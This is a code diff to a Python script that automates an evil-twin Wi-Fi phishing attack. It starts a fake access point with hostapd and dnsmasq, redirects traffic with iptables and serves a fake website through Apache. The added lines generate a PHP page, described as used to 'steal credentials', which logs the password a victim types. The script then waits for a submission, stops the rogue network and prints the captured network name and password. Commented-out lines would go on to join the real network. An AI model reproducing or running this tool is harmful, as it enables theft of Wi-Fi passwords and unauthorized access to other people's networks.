@@ -3,6 +3,7 @@ import csv
 from threading import Timer
 from os import system
 import time
+from os import path
 
 subprocess.call(['rm', 'output-01.csv'])
 subprocess.call(['airmon-ng', 'start', 'wlan0'])
@@ -31,6 +32,8 @@ with open('output-01.csv', newline='') as f:
 #print(name)
 #print(macAddr)
 #print(channel)
+
+
 
 subprocess.call(['rm', 'hostapd.conf'])
 
@@ -65,7 +68,7 @@ subprocess.call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dp
 subprocess.call(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-j', 'MASQUERADE'])
 #subprocess.call(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-p', 'tcp', '-d', '192.168.1.125', '--dport', '80', '-j', 'SNAT', '--to-source', '192.168.1.1'])
 
-subprocess.Popen(['hostapd', 'hostapd.conf'])
+proc1 = subprocess.Popen(['hostapd', 'hostapd.conf'])
 
 subprocess.call(['rm', 'dnsmasq.conf'])
 
@@ -79,7 +82,7 @@ with open('dnsmasq.conf', 'w') as f:
     f.write('log-dhcp\n')
     f.write('listen-address=127.0.0.1\n')
 
-subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf', '-d'])
+proc2 = subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf', '-d'])
 
 # Move Fake website into the directory that Apache hosts
 subprocess.call(['cp', './website/index.html', '/var/www/html/'])
@@ -92,4 +95,48 @@ subprocess.call(['chmod', '777', '/var/www/html/log.txt'])
 
 # Start the Apache sever to run fake website
 subprocess.call(['/etc/init.d/apache2', 'start'])
+
+# Create the php file used to steal credentials
+subprocess.call(['rm', './website/save.php'])
+with open('./website/save.php', 'w') as f:
+    f.write('<?php\n')
+    f.write('session_start();\n')
+    f.write('ob_start();\n')
+    f.write('$key1=$_POST[\'key1\'];\n')
+    f.write('$file = fopen(\'log.txt\', \'a\');\n')
+    f.write('fwrite($file, \'\' . \'' + name[1:] +  '\' . \':\' . $key1 . PHP_EOL);\n')
+    f.write('fclose($file);\n')
+    f.write('echo \"Success!\";\n')
+    f.write('sleep(6);\n')
+    f.write('ob_end_flush();\n')
+    f.write('?>\n')
+
+# Sleep until log.txt is written to
+while (path.getsize('/var/www/html/log.txt') == 0):
+   time.sleep(3)
+
+time.sleep(5)
+
+# Kill hostapd and dnsmasq background processes
+proc1.kill()
+proc2.kill()
+
+#subprocess.call(['ifconfig', 'wlan0mon', 'down'])
+#subprocess.call(['ifconfig', 'wlan0mon', 'up'])
+
+f = open('/var/www/html/log.txt', 'r')
+# Get first line. Remove possible newlines from end
+line = f.readline().strip('\n')
+
+# credentials[0] contains the essid
+# credentials[1] contains the password
+credentials = line.split(':')
+print(credentials[0])
+print(credentials[1])
+
+#with open('wpa.conf', 'w') as out:
+#   subprocess.call(['wpa_passphrase', credentials[0], credentials[1]], stdout=out)
+#print('Successfully wrote wpa.conf')
+
+#subprocess.call(['wpa_supplicant', '-iwlan0mon', '-Dnl80211', '-cwpa.conf'])
 
